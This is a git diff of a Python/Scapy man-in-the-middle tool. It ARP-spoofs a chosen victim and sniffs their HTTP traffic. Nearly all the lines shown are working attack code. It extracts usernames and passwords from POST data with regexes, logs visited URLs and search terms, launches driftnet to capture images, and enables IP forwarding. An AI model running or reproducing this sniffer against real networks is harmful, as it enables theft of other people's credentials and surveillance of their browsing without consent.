@@ -101,15 +101,6 @@ else:
 	victimIP = raw_input('\nType victim\'s IP: ')
 	print ''
 
-print "[+] Active interface: " + interface
-print "[+] Local IP: " + localIP
-print "[+] Interface MAC: " + localMAC
-print "[+] DHCP server: " + DHCPsrvr
-print "[+] DNS server: " + DNSsrvr
-print "[+] Local domain: " + local_domain
-print "[+] Router IP: " + routerIP
-print "[+] Client IP: " + victimIP
-
 def originalMAC(ip):
 	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
 	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
@@ -126,106 +117,103 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
 
 def URL(pkt):
 	global host, get, post, url
+	if pkt.haslayer(Raw) and pkt.haslayer(Ether):
+		if pkt[Ether].src == victimMAC:
+			pkt = repr(pkt[Raw].load)
+			try:
+				headers, body = pkt.split(r"\r\n\r\n")
+			except:
+				headers = pkt
+				body = ''
 
-	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
-		pkt = repr(pkt[Raw].load)
-		try:
-			headers, body = pkt.split(r"\r\n\r\n")
-		except:
-			headers = pkt
-			body = ''
+			header_lines = headers.split(r"\r\n")
+			for l in header_lines:
+				searchHost = re.search('[Hh]ost: ', l)
+				searchGet = re.search('GET /', l)
+				searchPost = re.search('POST /', l)
+				if searchHost:
+					host = l.split(' ')
+					host = host[1]
+				if searchGet:
+					get = l.split(' ')
+					get = get[1]
+				if searchPost:
+					post = l.split(' ')
+					post = post[1]
 
-#ADD HTML CHECKER THING HERE
+			#If a packet with data is retrasmitted amongst multiple packets this will catch all the split up parts that are lacking in features of a normal packet
+			if args.post and len(pkt) < 450:
+				if body != '':
+					username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+					password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+					if username != [] or password != []:
+						print T+'[+] Packet may\'ve been split. Load data:',body+W
+						for x in username:
+							for u in x:
+								if '=' in u:
+									print R+u+W
+						for y in password:
+							for p in y:
+								if '=' in p:
+									print R+p+W
+				if not get:
+					username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
+					password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
+					if username != [] or password != []:
+						print T+'[+] Packet may\'ve been split. Load data:',headers+W
+						for x in username:
+							for u in x:
+								if '=' in u:
+									print R+u+W
+						for y in password:
+							for p in y:
+								if '=' in p:
+									print R+p+W
 
-
-		header_lines = headers.split(r"\r\n")
-		for l in header_lines:
-			searchHost = re.search('[Hh]ost: ', l)
-			searchGet = re.search('GET /', l)
-			searchPost = re.search('POST /', l)
-			if searchHost:
-				host = l.split(' ')
-				host = host[1]
-			if searchGet:
-				get = l.split(' ')
-				get = get[1]
-			if searchPost:
-				post = l.split(' ')
-				post = post[1]
-
-		#If a packet with data is retrasmitted amongst multiple packets this will catch all the split up parts that are lacking in features of a normal packet
-		if args.post and len(pkt) < 450:
-			if body != '':
-				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
-				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
-				if username != [] or password != []:
-					print T+'[+] Packet may\'ve been split. Load data:',body+W
-					for x in username:
-						for u in x:
-							if '=' in u:
-								print R+u+W
-					for y in password:
-						for p in y:
-							if '=' in p:
-								print R+p+W
-			if not get:
-				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
-				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
-				if username != [] or password != []:
-					print T+'[+] Packet may\'ve been split. Load data:',headers+W
-					for x in username:
-						for u in x:
-							if '=' in u:
-								print R+u+W
-					for y in password:
-						for p in y:
-							if '=' in p:
-								print R+p+W
-
-		if host and get:
-			url = host+get
-		if host and post:
-			url = host+post
-		if url == None:
-			return
-
-		if args.post and post:
-			if body != '':
-				print B+'[+] POST:',url,'HTTP POST load:',body+W
-				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
-				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
-				for x in username:
-					for u in x:
-						if '=' in u:
-							print R+u+W
-				for y in password:
-					for p in y:
-						if '=' in p:
-							print R+p+W
-
-		if args.urlspy:
-			d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
-			if any(i in url for i in d):
+			if host and get:
+				url = host+get
+			if host and post:
+				url = host+post
+			if url == None:
 				return
-			if len(url) > 150:
-				print url[:149]
-			else:
+
+			if args.post and post:
+				if body != '':
+					print B+'[+] POST:',url,'HTTP POST load:',body+W
+					username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+					password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+					for x in username:
+						for u in x:
+							if '=' in u:
+								print R+u+W
+					for y in password:
+						for p in y:
+							if '=' in p:
+								print R+p+W
+
+			if args.urlspy:
+				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
+				if any(i in url for i in d):
+					return
+				if len(url) > 150:
+					print url[:149]
+				else:
+					print url
+
+			if args.verboseURL:
 				print url
 
-		if args.verboseURL:
-			print url
+			if args.search:
+				searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
+				if searched:
+					searched = searched.group(3)
+					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
+					print T + '[+] Searched %s for:' % host,searched + W
 
-		if args.search:
-			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
-			if searched:
-				searched = searched.group(3)
-				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
-				print T + '[+] Searched %s for:' % host,searched + W
-
-	host = None
-	get = None
-	post = None
-	url = None
+		host = None
+		get = None
+		post = None
+		url = None
 
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
@@ -273,15 +261,21 @@ class driftnet(threading.Thread):
 		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
 		Popen(xterm, stdout=PIPE, stderr=DN)
 
+print "[+] Active interface: " + interface
+print "[+] Local IP: " + localIP
+print "[+] Interface MAC: " + localMAC
+print "[+] DHCP server: " + DHCPsrvr
+print "[+] DNS server: " + DNSsrvr
+print "[+] Local domain: " + local_domain
+print "[+] Router IP: " + routerIP
+print "[+] Client IP: " + victimIP
 try:
 	routerMAC = originalMAC(routerIP)
 	print "[+] Router MAC: " + routerMAC
 	victimMAC = originalMAC(victimIP)
-	print "[+] Victim MAC: " + victimMAC + "\n"
+	print "[+] Victim MAC: " + victimMAC
 except:
 	sys.exit("Could not get MAC addresses")
-
-#Forward packets and flush iptables
 ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
 if not ipfwd.communicate()[0] == '1':
 	f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
